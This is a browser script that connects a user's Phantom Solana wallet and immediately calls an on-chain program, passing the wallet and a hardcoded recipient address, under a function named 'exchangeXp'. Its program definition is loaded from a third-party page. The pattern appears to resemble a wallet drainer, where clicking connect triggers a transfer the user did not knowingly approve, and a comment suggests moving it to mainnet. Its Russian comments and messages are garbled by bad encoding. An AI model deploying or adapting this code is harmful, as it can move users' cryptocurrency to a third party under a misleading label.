<script type="module">
  import { Connection, PublicKey } from "https://esm.sh/@solana/web3.js";
  import { Program, AnchorProvider, web3 } from "https://esm.sh/@project-serum/anchor";
  import idl from "https://dimer101.github.io/phantom_test0/sol_helper.json" assert { type: "json" };

  const programId = new PublicKey("H7p9WfN8hdozwak338EJZs3FrkvubyufHSzHRJzBCaGe");
  const recipient = new PublicKey("4CeTBGmYG7SFV9aGi4rCSX1Hu483RkPmtrJhiFp9S1Wx"); // üëà –∑–∞–º–µ–Ω–∏ –Ω–∞ –Ω—É–∂–Ω—ã–π

  const connection = new Connection("https://api.devnet.solana.com"); // –∏–ª–∏ mainnet
  const provider = new AnchorProvider(connection, window.solana, { commitment: "processed" });
  const program = new Program(idl, programId, provider);

  // üîÅ –§—É–Ω–∫—Ü–∏—è –≤—ã–∑–æ–≤–∞ —Å–º–∞—Ä—Ç-–∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞
  async function exchangeXp() {
    try {
      const tx = await program.methods.run().accounts({
        user: provider.wallet.publicKey,
        recipient: recipient,
        systemProgram: web3.SystemProgram.programId
      }).rpc();

      alert("‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞!\nTX ID: " + tx);
    } catch (err) {
      console.error("–û—à–∏–±–∫–∞:", err);
      alert("‚ùå –û—à–∏–±–∫–∞: " + (err.message || err));
    }
  }

  // üìå –ö–Ω–æ–ø–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∏ –∑–∞–ø—É—Å–∫–∞
  document.getElementById("connectButton").addEventListener("click", async () => {
    try {
      await window.solana.connect();
      await exchangeXp();
    } catch (err) {
      console.error("–û—à–∏–±–∫–∞:", err);
    }
  });
</script>
